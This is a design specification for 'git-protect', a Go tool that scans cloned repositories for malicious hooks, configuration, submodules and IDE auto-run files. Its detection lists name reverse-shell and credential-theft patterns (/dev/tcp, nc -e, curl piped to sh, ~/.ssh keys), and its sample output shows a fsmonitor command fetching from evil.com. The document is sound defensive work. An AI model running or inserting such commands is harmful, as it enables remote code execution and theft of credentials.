# git-protect: System-Level Protection Against Malicious Git Repositories

**Date:** 2026-05-24
**Status:** Approved

## Problem

Developers face increasing attacks via malicious git repositories. Common scenarios include interview test tasks, open-source dependency cloning, and social engineering where the victim clones a repo and unknowingly executes attacker code — resulting in credential theft, malware installation, or full system compromise.

No existing tool defends against inbound malicious repo content at clone time. The entire ecosystem (Gitleaks, TruffleHog, Talisman, git-secrets) focuses on outbound secret prevention — scanning for credentials you accidentally commit. Nobody scans for what a repo might do to YOU.

## Solution

`git-protect` is a Go CLI binary that provides system-level protection against malicious git repositories through three mechanisms:

1. **Safe clone wrapper** (`git-protect clone`) — fetches without checkout, scans, then checks out only if safe
2. **Global git hooks** (`core.hooksPath`) — tamper-proof post-checkout/post-merge hooks that scan every checkout
3. **Git config hardening** — disables known dangerous defaults (`core.fsmonitor`, `safe.bareRepository`)

## Architecture

```
+-----------------------------------------------------+
|                   git-protect CLI                    |
+----------+--------------+--------------+------------+
|  clone   |    scan      |   install    |   trust    |
| (proactive) (on-demand) | (setup hooks)| (allowlist)|
+----+-----+------+-------+------+-------+-----+------+
     |            |              |             |
     v            v              v             v
+---------+ +----------+ +-----------+ +-----------+
| Safe    | | Threat   | | Hook      | | Trust     |
| Clone   | | Detection| | Manager   | | Store     |
| Engine  | | Engine   | |           | |           |
+---------+ +----------+ +-----------+ +-----------+
```

### Data Flow: `git-protect clone <url>`

1. `git clone --no-checkout <url> <dir>` — fetches git objects, no file extraction
2. Pre-checkout scan: `.git/config`, `.git/hooks/`, `.gitmodules` (directly on disk); `.gitattributes` read via `git show HEAD:.gitattributes` from the object store (not on disk until checkout)
3. If CRITICAL/HIGH threats found: block with detailed report, remove the cloned directory
4. If clean or trusted: `git checkout`, then post-checkout scan runs a second pass on extracted files (scripts, IDE configs, devenv, unicode, build-hooks — content that only exists after checkout)
5. Report summary to user

Note: partial clones (`--filter=blob:none`) defer blob fetching until checkout. Pre-checkout content scanning is degraded in this case — the user is warned, and the post-checkout pass becomes the primary scan.

### Data Flow: Global post-checkout hook (safety net)

1. Fires after any checkout (clone, switch, pull) — even raw `git clone` without the wrapper
2. Checks trust store — trusted repos get fast-path exit (near-zero overhead)
3. Runs Threat Detection Engine
4. If threats found: prints a prominent warning to stderr with threat details

Note: git ignores the exit code of `post-checkout` hooks — the hook cannot abort the checkout. It serves as a **warning mechanism** that makes threats visible to the user immediately after checkout. The primary defense is `git-protect clone` (which blocks before checkout) and the git config hardening (which disables the most dangerous vectors globally). The hook catches the remaining cases where a user does a raw `git clone`.

### Global Git Config Hardening

`git-protect install` sets three global git config values:

| Config | Value | Purpose |
|---|---|---|
| `core.hooksPath` | `~/.config/git-protect/hooks/` | All repos use our hooks; `.git/hooks/` is ignored system-wide |
| `safe.bareRepository` | `explicit` | Blocks embedded bare repo attacks (fsmonitor in buried `.git/config`) |
| `core.fsmonitor` | `false` | Globally disables fsmonitor command execution |

The combination of these three makes even a raw `git clone` (without our wrapper) defended:
- `.git/hooks/` overridden by `core.hooksPath`
- Embedded bare repos blocked by `safe.bareRepository`
- `core.fsmonitor` disabled globally

## Threat Detection Engine

The scanner analyzes a repo and produces a structured report. Each finding has a severity level:

- **CRITICAL** — immediate code execution risk, always blocks (only `--trust` overrides)
- **HIGH** — likely malicious, blocks by default (only `--trust` overrides)
- **MEDIUM** — suspicious but possibly legitimate, warns but does not block
- **INFO** — noteworthy, verbose mode only

The `--trust` flag is the only override for CRITICAL/HIGH findings. There is no `--allow-high` or similar granular bypass — the choice is binary: trust the repo or don't.

### Detection Modules

#### 1. `hooks` — CRITICAL

Scans `.git/hooks/` for any executable files. In a freshly cloned repo, hooks should only come from `init.templateDir`. Any executable hook is suspicious.

#### 2. `config` — CRITICAL

Scans `.git/config` for dangerous directives that execute arbitrary commands:

| Config key | Trigger |
|---|---|
| `core.fsmonitor` | `git status` (IDEs trigger automatically) |
| `core.pager` | `git log`, `git diff`, any paged output |
| `core.editor` | `git commit`, `git rebase -i` |
| `core.sshCommand` | `git fetch`, `git push` |
| `core.askPass` | Any operation needing credentials |
| `core.hooksPath` | Redirects all hook lookups |
| `credential.helper` | Any authenticated git operation |
| `diff.*.textconv` | `git diff`, `git show` |
| `diff.external` | `git diff` |
| `merge.tool` | `git mergetool` |
| `filter.*.smudge` | `git checkout` (per-file) |
| `filter.*.clean` | `git add` (per-file) |
| `filter.*.process` | `git checkout`/`git add` (long-running) |
| `alias.*` with `!` prefix | `git <alias>` — shell execution |
| `http.sslCAInfo` | Any remote operation — MITM via attacker CA cert |
| `http.proxy` | Any remote operation — traffic redirect |
| `sendemail.smtpserver` | `git send-email` — data exfiltration |

#### 3. `config-include` — CRITICAL

Detects `include.path` and `includeIf.*` directives in `.git/config`. Resolves and scans referenced config files. CVE-2023-29007 showed config injection via overlong submodule URLs can smuggle `include` directives.

#### 4. `attributes` — HIGH

Scans `.gitattributes` (in any directory) for `filter=`, `diff=`, `merge=` attributes with custom drivers. These cause git to execute commands specified in `filter.<name>.smudge`, etc., during checkout.

#### 5. `submodules` — CRITICAL

Scans `.gitmodules` for:
- `ext::` protocol URLs (arbitrary command execution)
- Path traversal (`../`) in submodule paths
- Carriage return smuggling in paths (CVE-2025-48384)
- URLs pointing to non-standard hosts (not github.com, gitlab.com, etc.)

#### 6. `symlinks` — HIGH

Detects any symlink whose target resolves outside the repository tree. On case-insensitive filesystems, also checks for case-confused paths that could escape via CVE-2024-32002 / CVE-2021-21300.

#### 7. `bare-repos` — CRITICAL

Recursively scans the working tree for embedded `.git/` directories (buried bare repositories). These are the attack surface for the `core.fsmonitor` RCE — opening an embedded repo in an IDE triggers `git status` which reads the embedded `.git/config`.

#### 8. `ide-configs` — HIGH

Scans for IDE configuration files that auto-execute:

| File | Attack |
|---|---|
| `.vscode/tasks.json` with `"runOn": "folderOpen"` | Auto-executes task on folder open |
| `.vscode/settings.json` | Override interpreters (`python.pythonPath`, `git.path`), terminal env |
| `.idea/` workspace XML files | Auto-run configurations in JetBrains IDEs |

Actively weaponized in the "Contagious Interview" campaign (2025-2026).

#### 9. `devenv` — HIGH

Scans for dev environment hooks:

| File | Attack |
|---|---|
| `.devcontainer/devcontainer.json` | `postCreateCommand`, `postStartCommand`, `postAttachCommand` lifecycle hooks; exfiltrates `GITHUB_TOKEN` in Codespaces |
| `.envrc` | Auto-executes via direnv on `cd` into directory |

#### 10. `scripts` — MEDIUM

Heuristic scan of shell, Python, and JavaScript files for exfiltration patterns:

**Credential access:**
- `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`
- `~/.aws/credentials`, `~/.aws/config`
- `~/.gnupg/`, `~/.config/gcloud/`
- `$AWS_SECRET_ACCESS_KEY`, `$GITHUB_TOKEN`, `$NPM_TOKEN`

**Network exfiltration:**
- `curl ... | sh`, `wget ... | bash`
- `/dev/tcp/`, `nc -e`, `bash -i >& /dev/tcp/`
- `python -c "import socket"`

**Obfuscation:**
- `eval(base64_decode(...))`, `echo ... | base64 -d`
- `\x` hex escape sequences in shell scripts
- `python -c "exec(...)"`

#### 11. `build-hooks` — MEDIUM

Scans package manager and build tool configs:

| File | Pattern |
|---|---|
| `package.json` | `preinstall`, `postinstall`, `prepare` scripts |
| `Makefile` | `$(shell ...)` invocations |
| `setup.py` / `setup.cfg` | `subprocess`, `os.system` calls |
| `.cargo/config.toml` | Build scripts with network access |

#### 12. `unicode` — MEDIUM

Scans source files for:
- **BiDi control characters** (Trojan Source / CVE-2021-42574): Unicode directional override characters that reorder how code appears vs. how it executes
- **Homoglyph identifiers** (CVE-2021-42694): Visually identical Unicode characters substituting for ASCII in function/variable names

#### 13. `ci-pipelines` — INFO

Scans CI/CD pipeline definitions for suspicious steps:
- `.github/workflows/*.yml` — uses of `actions/checkout` with untrusted refs, `run:` steps with suspicious commands
- `.gitlab-ci.yml` — `script:` steps with network exfiltration patterns

## CLI Commands

### `git-protect install`

Sets up global protection. Idempotent — safe to run multiple times.

```
$ git-protect install

  Setting up global git protection...

  [ok] core.hooksPath = ~/.config/git-protect/hooks/
  [ok] safe.bareRepository = explicit
  [ok] core.fsmonitor = false
  [ok] Installed post-checkout hook
  [ok] Installed post-merge hook
  [ok] Created trust store at ~/.config/git-protect/trust.toml

  Protection active. All future clones and checkouts will be scanned.
```

Detects and handles conflicts with existing `core.hooksPath` settings (Husky, pre-commit, Lefthook) by offering to wrap existing hooks.

Flags:
- `--alias` — sets `git config --global alias.clone '!<absolute-path-to-git-protect> clone'` for transparent protection. Uses the resolved absolute path of the binary (not a bare name) to prevent PATH hijacking
- `--dry-run` — show what would be changed without applying

### `git-protect uninstall`

Removes all global config changes, restores original values, removes hooks directory.

### `git-protect clone <url> [<dir>]`

Safe clone: `--no-checkout` then scan then checkout.

```
$ git-protect clone https://github.com/suspicious-corp/interview-task.git

  Cloning (no-checkout)... done.
  Scanning for threats...

  CRITICAL  .git/config: core.fsmonitor = "curl http://evil.com/c.sh|sh"
  HIGH      .vscode/tasks.json: task "setup" has runOn: folderOpen
  HIGH      .gitattributes: filter "build" on *.c -- smudge: "./scripts/inject.sh"

  BLOCKED -- 3 threats found. Repository has NOT been checked out.

  Actions:
    git-protect clone --show-threats <url>    Full threat analysis
    git-protect clone --trust <url>           Clone anyway, add to trustlist

  Cleaned up: ./interview-task removed.
```

On clean scan:

```
$ git-protect clone https://github.com/legit-org/real-project.git

  Cloning (no-checkout)... done.
  Scanning for threats... clean.
  Checking out... done.

  Repository cloned safely to ./real-project
```

Flags:
- `--show-threats` — detailed analysis of each finding
- `--trust` — clone despite threats and add repo to trust store
- `--json` — machine-readable output
- All standard `git clone` flags are passed through (e.g., `--depth`, `--branch`, `--recurse-submodules`)

### `git-protect scan [<dir>]`

Scan an existing repo on disk.

```
$ git-protect scan

  Scanning ./some-repo...

  MEDIUM    package.json: postinstall script runs "node scripts/setup.js"
  MEDIUM    scripts/setup.js: contains curl to external URL (line 14)

  2 MEDIUM findings. No critical threats.
```

Flags:
- `--json` — machine-readable output for CI integration
- `-v` / `--verbose` — detailed info on each finding
- `--severity <level>` — filter by minimum severity (critical, high, medium, info)
- `--modules <list>` — run specific scanner modules only
- `--exit-code` — exit non-zero on findings at or above threshold (for CI gating)

### `git-protect trust`

Manage the trust/allowlist.

```
$ git-protect trust list
$ git-protect trust add <pattern>
$ git-protect trust remove <pattern>
$ git-protect trust check [--quiet]   # check if current repo is trusted
```

### `git-protect status`

Show current protection status.

```
$ git-protect status

  git-protect v0.1.0

  Protection:
    core.hooksPath        ~/.config/git-protect/hooks/    active
    safe.bareRepository   explicit                        active
    core.fsmonitor        false                           active
    clone alias           not set                         optional

  Trust store: ~/.config/git-protect/trust.toml (2 entries)
  Detection modules: 13 loaded
```

## Trust System

### Trust Store

Location: `~/.config/git-protect/trust.toml`

```toml
[[trust]]
pattern = "github.com/mycompany/*"
type = "org"
added = 2026-05-20
note = "Internal org, all repos verified"

[[trust]]
pattern = "github.com/torvalds/linux"
type = "repo"
added = 2026-05-18

[[trust]]
pattern = "gitlab.internal.corp/*"
type = "host"
added = 2026-05-15
note = "Corporate GitLab instance"
```

### Trust Types

- `repo` — exact match on a single repository URL
- `org` — wildcard on an organization/group (`github.com/mycompany/*`)
- `host` — wildcard on an entire host (`gitlab.internal.corp/*`)

### Matching Rules

- URLs normalized before matching: strip protocol, `.git` suffix, trailing slashes
- SSH URLs (`git@github.com:org/repo.git`) are normalized to the same format as HTTPS (`github.com/org/repo`) — colon-separated host:path is converted to slash-separated
- Local path clones (`file:///path` or bare `/path`) are always scanned and cannot be trusted by path (to prevent attackers using local repos to bypass trust)
- Trust checked before scanning — trusted repos get fast path (no scan overhead)
- `--trust` flag on clone requires an interactive TTY confirmation prompt ("Are you sure you want to trust this repository? [y/N]"). If stdin is not a TTY (scripted/piped usage), `--trust` is rejected — use `git-protect trust add <url>` explicitly instead
- Nothing trusted by default — not even github.com

## Hook Integration and Chaining

### Hooks Directory

`~/.config/git-protect/hooks/` contains:
- `post-checkout` — scans after any checkout (clone, switch, pull)
- `post-merge` — scans after merge (catches `git pull` with merge strategy)

### Hook Chaining

When `core.hooksPath` overrides `.git/hooks/`, legitimate project hooks stop working. We solve this:

1. Our hooks check if the current repo has hooks in `.git/hooks/` or a custom hooks directory
2. If the repo is **trusted**, our hooks execute the repo's hooks after our scan
3. If the repo is **not trusted**, repo hooks are NOT chained (they could be malicious)

### Compatibility with Hook Managers

Users of Husky, pre-commit, or Lefthook typically set `core.hooksPath` themselves. `git-protect install` detects this and:

1. Warns about the conflict
2. Offers to wrap the existing hooks path — our hooks run first, then chain to the original path
3. Stores the original `core.hooksPath` value for restoration on uninstall

## Technology Choices

| Choice | Rationale |
|---|---|
| Go | Single binary, no runtime deps, fast, cross-platform, strong CLI ecosystem (cobra/viper) |
| TOML for trust store | Human-readable, easy to edit manually, standard for config files |
| XDG paths (`~/.config/git-protect/`) | Follows Linux conventions, overridable via `$XDG_CONFIG_HOME` |
| Modular scanner design | Each detection module is independent — easy to add new modules, test in isolation |

## Testing Strategy

- **Unit tests**: Each of the 13 detection modules tested with crafted malicious fixtures
- **Integration tests**: Full `git-protect clone` flow with git repos containing known attack patterns
- **CVE regression tests**: Specific test cases for CVE-2024-32002, CVE-2024-32465, CVE-2025-48384, CVE-2021-42574
- **False positive tests**: Scan popular repos (linux kernel, kubernetes, go stdlib) to verify low false-positive rate
- **Hook chaining tests**: Verify legitimate hooks work in trusted repos
- **Performance**: Scanning overhead under 500ms for repos up to 10k files

## Future Roadmap (not in v1)

- **eBPF enforcement layer**: Kernel-level interception via LSM hooks — defense in depth
- **Signature database**: Community-updated known-malicious payload signatures
- **System packages**: rpm/deb for enterprise deployment with auto-config
- **CI integration**: GitHub Action / GitLab CI template for `git-protect scan` on incoming PRs
- **IDE extensions**: VS Code / JetBrains plugins that trigger scan on project open
